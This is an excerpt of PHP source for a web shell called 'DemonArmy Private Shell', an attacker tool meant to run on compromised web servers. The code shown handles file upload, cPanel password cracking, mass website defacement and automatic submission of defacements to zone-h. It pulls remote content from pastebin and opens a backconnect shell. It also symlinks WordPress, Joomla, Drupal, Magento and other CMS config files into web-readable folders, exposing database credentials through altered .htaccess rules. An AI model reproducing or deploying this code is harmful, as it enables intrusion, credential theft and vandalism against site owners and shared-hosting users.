...
// DemonArmy Private Shell
// Use your own risk
// Hard coded by DemonArmy
...
// Start configuration
$shell_name = 'DemonArmy';
$shell_slogan = 'The Next Level Shell';
$shell_version = '2.1';
...
if(isset($_POST['upload'])) {
  if(@copy($_FILES['army']['tmp_name'], "$dir/".$_FILES['army']['name']."")){
    $actx = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['army']['name']."</b></i>";
  } else {
...
if (file_exists('0x1/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "da/'.$names.'.php";</script> ';
	}
	else {mkdir("0x1", 0777);
...
<noscript><input type="submit" value="Submit"></noscript>
  ...
  <tr>
	...
	echo"</td>
	<td align='right'><form method='post' enctype='multipart/form-data'><input type='file' name='army'><input type='submit' value='upload' name='upload'></form></td>
  </tr>
  <tr>
...
elseif(isset($_GET['do']) && ($_GET['do'] == 'cpanel')) {
  if($_POST['crack']) {
    ...
    if($i == 0) {
      ...
      echo "<br>Nemu ".$i." Cpanel by <font color=lime>DemonArmy</font>";
    }
  } else {
    echo "<center>
    <form method='post'>
...
document.getElementById('arsip').addEventListener('change', function () {
    ...
    document.getElementById('defacerid').style.display = style;
        ...
        <option value='2'>Zone-X</option></select><br>
		<u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='DemonArmy'><br>
<div id='Zone-X' style='display: none;'><br>
<u>Team</u>:<br> 
        <input type='text' name='tim' size='50' value='AnonSec Team'><br><br>
		</div>
        <u>Domains</u>: <br>
...
@file_put_contents($hh ,file_get_contents("https://pastebin.com/raw/AYkX3LU4"));
function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
...
if($_POST['gass']) {
    ...
    echo"</textarea><br>
        ...
        <form method='post'>
        Link Config: <br>
        <input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/da/'><br>
        <input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
        </form></center>";
    }
if($_POST['grabpass']) {
...
<td>".$user['name']."</td>
<td><a href='$full/dalink/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/dalink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";
}else{
...
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("dav/.htaccess",$htaccess);
...
exe("ln -s ".$user."/httpdocs/wp-config.php dav/".$usera."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php dav/".$usera."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php dav/".$usera."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php dav/".$usera."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php dav/".$usera."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php dav/".$usera."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml dav/".$usera."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php dav/".$usera."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php dav/".$usera."-Ellislab.txt"); 
}}}
...
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("da/.htaccess",$htaccess);}
...
IndexIgnore *.txt404
IndexStyleSheet 'https://DemonArmy.github.io/0xShell/style/melex.css'
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*da404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("da404/.htaccess",$htaccess);
}
if($_POST['tipe'] == 'grab') {
						mkdir("dagrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("dagrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];
...
$file_config = fopen("dagrab/$user_cox-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['tipe'] == 'grabsym') {
@symlink($config,"da/".$user_cox."-".$nama_config.".txt");
}
if($_POST['tipe'] == 'grabsym404') {
$sym404=symlink($config,"da404/".$user_cox."-".$nama_config.".txt");
if($sym404){
	@mkdir("da404/".$user_cox."-".$nama_config.".txt404", 0777);
...
@file_put_contents("da404/".$user_cox."-".$nama_config.".txt404/.htaccess",$xsym404);

@symlink($config,"da404/".$user_cox."-".$nama_config.".txt404/0x.txt");
            ...
            echo "<center><a href='?dir=$dir/dagrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['tipe'] == 'grabsym404') {
        echo "<center>
<a href=\"da404/root/\">Root Server</a>
<br><a href=\"da404/\">Configurations</a></center>";
    }
     if($_POST['tipe'] == 'grabsym') {
echo "<center>
<a href=\"da/root/\">Root Server</a>
<br><a href=\"da/\">Configurations</a></center>";
			}if($_POST['tipe'] == 'grabsymv') {
echo "<center>
<a href=\"dav/root/\">Root Server</a>
<br><a href=\"dav/\">Configurations</a></center>";
			}
...
elseif(isset($_GET['do']) && ($_GET['do'] == 'jump')) {
    ...
    elseif($_POST['mass'] == 'massdeface') {
        ...
        <textarea name='script' style='width: 450px; height: 200px;'>Hacked By DemonArmy</textarea><br>
  ...
  <div id="back">
        ...
        if(isset($_POST['bind']))
            ...
            if($errno != 0){
              ...
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: Mobil shell v1 - Coded By DemonArmy ::..
                \n
                \n=> Backconnect 
                \n=> Back 
                \n
              ...
              while(!feof($sockfd)){ $cmdPrompt = '[da]#:> ';
...
elseif(isset($_GET['do']) && ($_GET['do'] == 'serverinfo')){
  ...
  if(extension_loaded('curl')){$curls="<span class='enabled'>[ON]</span>";}else{$curls="<span class='disabled'>[OFF]</span>";}
	...
	echo "
		<h4>Information</h4>
		<p>$shell_name v$shell_version remake by DemonArmy.</p>";

		?>
			<ul>
				<li>source code 0xShell</li>
				<li>Contact demonarmy611@gmail.com</li>
				<li>Thankss.</li>
			</ul>
			<br /><br />
			<?php
